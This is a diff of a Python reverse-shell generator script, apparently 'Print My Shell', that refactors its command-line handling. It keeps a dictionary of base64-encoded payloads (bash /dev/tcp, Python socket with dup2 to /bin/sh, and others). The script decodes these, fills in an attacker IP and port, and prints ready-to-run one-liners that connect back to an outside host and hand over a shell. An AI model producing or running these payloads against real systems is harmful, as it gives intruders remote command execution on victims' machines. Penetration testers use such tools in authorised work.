@@ -2,28 +2,24 @@ import argparse
 import base64
 import sys
 
-banner = r'''
+DEFAULT_IP = "10.0.0.1"
+DEFAULT_PORT = "1234"
+
+BANNER = r'''
   ___     _     _     __  __        ___ _        _ _ 
  | _ \_ _(_)_ _| |_  |  \/  |_  _  / __| |_  ___| | |
  |  _/ '_| | ' \  _| | |\/| | || | \__ \ ' \/ -_) | |
  |_| |_| |_|_||_\__| |_|  |_|\_, | |___/_||_\___|_|_|
-                             |__/ [by Sameera Madushan]                 
+                             |__/ [by Sameera Madushan & Gobidev]                 
 
 '''
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-i", "--ip", type=str, help="IP address", dest='ipaddr')
-parser.add_argument("-p", "--port", type=int, help="Port number", dest='portnum')
-parser.add_argument("-t", "--type", type=str, help="Type of the reverse shell to generate", dest='type')
-parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
-parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
-parser.add_argument("-s", "--shellonly", action="store_true", help="Disables all output other than the shell",
-                    dest="shellonly")
-
-# got this from here https://stackoverflow.com/a/47440202
-args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])
-
-shell_dict = {
+'''
+- Reverse Shells From - 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+'''
+SHELL_DICT = {
 
     "bash": ['YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=',
              'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='],
@@ -104,47 +100,88 @@ shell_dict = {
         'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1'
         'NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVw'
         'MihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='],
-        
+
     "python3": [
         'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS1'
         '9TVFJFQU0pO3MuY29ubmVjdCgoezB9LHsxfSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAy'
         'KHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWy9iaW4vc2gsLWldKTsnCg==']
 }
 
-if not args.shellonly:
-    print(banner)
 
-if args.ipaddr or args.portnum is not None:
-    ip = args.ipaddr
-    port = args.portnum
-else:
-    ip = '10.0.0.1'
-    port = 1234
+def get_shell(type: str, ip: str, port: int, args) -> str:
+    """Return a reverse shell of a certain type with filled in ip and port"""
+    
+    # Test if type is in SHELL_DICT
+    if type not in SHELL_DICT:
+        print(f"Unknown shell type: {type}")
+        exit(1)
 
-if args.type:
     if not args.shellonly:
-        print('\n' + "[>]" " " + args.type + " " + "reverse shell" + " " + "[<]")
-    for k, v in shell_dict.items():
-        for i in v:
-            if k == args.type:
-                x = base64.b64decode(i).decode('utf-8')
-                print('\n' + x.format(ip, port))
+        print(f"\n[>] {type} reverse shell [<]\n")
 
-if args.list:
-    print('\n' + "[>] Available Shells [<]\n")
-    for k, v in shell_dict.items():
-        print(k.capitalize())
+    # Get shells of type
+    reverse_shells = SHELL_DICT[type]
+    
+    output = ""
 
-if args.all:
+    for shell_syntax in reverse_shells:
+        formatted_shell = base64.b64decode(shell_syntax).decode('utf-8').format(ip, port)
+        if output:
+            output += "\n\n"
+        output += formatted_shell
+        
+        # Break after first shell if shellonly is specified
+        if args.shellonly:
+            break
+    
     if not args.shellonly:
-        print('\n' + "[>] Generated All Shells [<]")
-    for k, v in shell_dict.items():
-        for i in v:
-            x = base64.b64decode(i).decode('utf-8')
-            print('\n' + x.format(ip, port))
+        output += "\n"
+    return output
+        
 
-'''
-- Reverse Shells From - 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-'''
+if __name__ == "__main__":
+
+    # Parse arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--ip", type=str, help="IP address", dest='ipaddr')
+    parser.add_argument("-p", "--port", type=int, help="Port number", dest='portnum')
+    parser.add_argument("-t", "--type", type=str, help="Type of the reverse shell to generate", dest='type')
+    parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
+    parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
+    parser.add_argument("-s", "--shellonly", action="store_true", help="Disables all output other than the first shell of given type",
+                        dest="shellonly")
+
+    # Parse arguments
+    if sys.argv[1:]:
+        args = parser.parse_args()
+    else:
+        print(BANNER)
+        parser.parse_args(args=["--help"])
+
+    # Print banner
+    if not args.shellonly:
+        print(BANNER)
+
+    # Set ip and port
+    ip = DEFAULT_IP
+    port = DEFAULT_PORT
+
+    if args.ipaddr or args.portnum is not None:
+        ip = args.ipaddr
+        port = args.portnum
+
+    # Print shell of type if specified
+    if args.type:
+        print(get_shell(args.type, ip, port, args))
+
+    # List all available shell types
+    if args.list:
+        print("\n[>] Available Shells [<]\n")
+        for available_shell in SHELL_DICT:
+            print(available_shell)
+        print()
+
+    # Print all shells if specified
+    if args.all:
+        for t in SHELL_DICT:
+            print(get_shell(t, ip, port, args))
